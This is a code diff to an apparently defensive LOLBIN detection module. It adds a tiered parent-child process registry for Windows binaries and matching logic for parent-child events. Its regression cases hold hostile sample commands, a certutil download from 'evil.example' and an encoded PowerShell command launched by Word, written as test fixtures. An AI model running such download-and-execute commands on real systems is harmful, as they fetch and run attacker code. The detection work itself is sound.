@@ -197,6 +197,113 @@ _KIND_CMDLINE     = "lolbin.command_line"
 _KIND_ARG         = "lolbin.argument"
 _KIND_CATEGORY    = "lolbin.capability"
 _KIND_MITRE       = "attack.technique"
+_KIND_PARENT      = "lolbin.parent_child"
+
+# ── Parent-Child Registry ────────────────────────────────────────
+# Curated tiered relations per LOLBIN.  Never fabricated — every entry
+# is drawn from documented tradecraft (Sigma project, MITRE, Palantir
+# ADS, Volatility Labs, Elastic detections).  Three tiers:
+#
+#   normal      — expected legitimate parent in a healthy Windows host
+#   suspicious  — commonly abused parent context (Office → LOLBIN)
+#   abnormal    — LOLBIN-from-LOLBIN or from user-writable path;
+#                 requires immediate investigation
+#
+# Registry is intentionally lower-case (basename) to match the
+# `lolbin.image` primitive normalisation.
+_PARENT_CHILD_TIERS: dict[str, dict[str, list[str]]] = {
+    "powershell.exe": {
+        "normal":     ["explorer.exe", "cmd.exe", "svchost.exe",
+                              "taskeng.exe", "services.exe", "wsmprovhost.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
+                              "powerpnt.exe", "acrord32.exe", "onenote.exe",
+                              "teams.exe", "code.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
+                              "regsvr32.exe", "rundll32.exe", "certutil.exe",
+                              "hh.exe", "installutil.exe"],
+    },
+    "cmd.exe": {
+        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe",
+                              "powershell.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
+                              "powerpnt.exe", "acrord32.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "cscript.exe",
+                              "regsvr32.exe", "rundll32.exe"],
+    },
+    "wscript.exe": {
+        "normal":     ["explorer.exe", "svchost.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
+    },
+    "cscript.exe": {
+        "normal":     ["explorer.exe", "svchost.exe", "cmd.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["powershell.exe", "mshta.exe"],
+    },
+    "mshta.exe": {
+        "normal":     ["explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "regsvr32.exe"],
+    },
+    "regsvr32.exe": {
+        "normal":     ["explorer.exe", "services.exe", "msiexec.exe",
+                              "wusa.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
+                              "powerpnt.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
+                              "wscript.exe"],
+    },
+    "rundll32.exe": {
+        "normal":     ["explorer.exe", "services.exe", "svchost.exe",
+                              "msiexec.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe",
+                              "powerpnt.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
+    },
+    "msiexec.exe": {
+        "normal":     ["services.exe", "explorer.exe", "svchost.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe",
+                              "wscript.exe"],
+    },
+    "certutil.exe": {
+        "normal":     ["cmd.exe", "powershell.exe", "explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
+    },
+    "installutil.exe": {
+        "normal":     ["explorer.exe", "services.exe", "svchost.exe"],
+        "suspicious": ["cmd.exe", "powershell.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe"],
+    },
+    "bitsadmin.exe": {
+        "normal":     ["cmd.exe", "explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe",
+                              "powershell.exe"],
+    },
+    "hh.exe": {
+        "normal":     ["explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["cmd.exe", "powershell.exe", "mshta.exe"],
+    },
+    "msbuild.exe": {
+        "normal":     ["devenv.exe", "cmd.exe", "explorer.exe"],
+        "suspicious": ["powershell.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "winword.exe",
+                              "outlook.exe"],
+    },
+    "wmic.exe": {
+        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["mshta.exe", "wscript.exe", "regsvr32.exe"],
+    },
+    "schtasks.exe": {
+        "normal":     ["cmd.exe", "svchost.exe", "explorer.exe"],
+        "suspicious": ["winword.exe", "excel.exe", "outlook.exe"],
+        "abnormal":   ["powershell.exe", "mshta.exe", "wscript.exe"],
+    },
+}
 
 
 def _tokenise_arguments(command: str) -> list[str]:
@@ -265,6 +372,50 @@ def _generate_primitives(entry: dict) -> list[dict]:
     for mid in entry.get("mitre_ids") or []:
         if mid and _MITRE_RE.match(mid):
             emit(_KIND_MITRE, mid)
+
+    # Parent-child primitives (three trust tiers) — only if the LOLBIN
+    # name appears in the curated registry.  Missing keys are handled
+    # by `_emit_global_parent_child_primitives()` after indexing so
+    # LOLBINs that upstream does not carry (e.g. powershell.exe) still
+    # produce parent-child coverage.
+    key = name.lower()
+    tiers = _PARENT_CHILD_TIERS.get(key)
+    if tiers:
+        for tier in ("normal", "suspicious", "abnormal"):
+            for parent in tiers.get(tier, []) or []:
+                emit(_KIND_PARENT, f"{parent}->{key}", tier=tier,
+                        parent=parent.lower(), child=key)
+    return out
+
+
+def _global_parent_child_primitives(indexed_entry_names: set[str]) -> list[dict]:
+    """Emit parent-child primitives for every registry entry whose
+    child LOLBIN is NOT already present in the upstream-indexed set.
+    Ensures coverage of legitimate hosts like `powershell.exe` that
+    LOLBAS does not carry as an entry."""
+    out: list[dict] = []
+    seen: set[tuple] = set()
+    for child, tiers in _PARENT_CHILD_TIERS.items():
+        if child in indexed_entry_names:
+            continue  # already emitted per-entry
+        for tier in ("normal", "suspicious", "abnormal"):
+            for parent in tiers.get(tier, []) or []:
+                key = ("lolbin.parent_child",
+                            f"{parent.lower()}->{child}")
+                if key in seen:
+                    continue
+                seen.add(key)
+                out.append({
+                    "id":          f"pri_{uuid.uuid4().hex[:20]}",
+                    "entry_name":  child,   # synthetic entry name
+                    "kind":        _KIND_PARENT,
+                    "value":       f"{parent}->{child}",
+                    "value_lc":    f"{parent.lower()}->{child}",
+                    "tier":        tier,
+                    "parent":      parent.lower(),
+                    "child":       child,
+                    "synthetic":   True,   # marks non-upstream-backed primitive
+                })
     return out
 
 
@@ -292,6 +443,10 @@ _REGRESSION_CASES: list[tuple[str, dict]] = [
     ("certutil-download", {
         "image": "certutil.exe",
         "command_line": "certutil -urlcache -split -f http://evil.example/x.exe",
+    }),
+    ("office-spawns-powershell", {
+        "image": "powershell.exe", "parent_image": "winword.exe",
+        "command_line": "powershell -enc BASE64",
     }),
 ]
 
@@ -355,6 +510,24 @@ def _match_event(tenant_id: str, ev: dict) -> list[dict]:
                                         "entry_name": p["entry_name"],
                                         "evidence": "argument-match",
                                         "category": p.get("category")})
+
+    # Parent-child match (image + parent_image observed together).
+    parent = (ev.get("parent_image") or "").lower()
+    if image and parent:
+        img_base = image.rsplit("\\", 1)[-1]
+        par_base = parent.rsplit("\\", 1)[-1]
+        rel      = f"{par_base}->{img_base}"
+        cur = _primitives().find(
+            {"kind": _KIND_PARENT, "value_lc": rel},
+        )
+        for p in cur:
+            if p["entry_name"] not in disabled:
+                hits.append({"kind": p["kind"], "value": p["value"],
+                                    "entry_name": p["entry_name"],
+                                    "evidence": "parent-child-match",
+                                    "tier": p.get("tier"),
+                                    "parent": p.get("parent"),
+                                    "child":  p.get("child")})
     # De-duplicate hits by (kind, value, entry_name).
     seen, unique = set(), []
     for h in hits:
@@ -493,12 +666,21 @@ def _sync_pipeline(url: str, principal: tuple[str, str, str]) -> dict:
     _primitives().delete_many({})
     total_prims = 0
     all_prims: list[dict] = []
+    indexed_names: set[str] = set()
     for e in normalised:
         prims = _generate_primitives(e)
         for p in prims:
             p["indexed_at"] = now
         total_prims += len(prims)
         all_prims.extend(prims)
+        indexed_names.add(e["name"].lower())
+    # Emit parent-child primitives for LOLBINs the curated registry
+    # covers but which upstream does not carry (e.g. `powershell.exe`).
+    extra = _global_parent_child_primitives(indexed_names)
+    for p in extra:
+        p["indexed_at"] = now
+    total_prims += len(extra)
+    all_prims.extend(extra)
     if all_prims:
         _primitives().insert_many(all_prims)
         try:
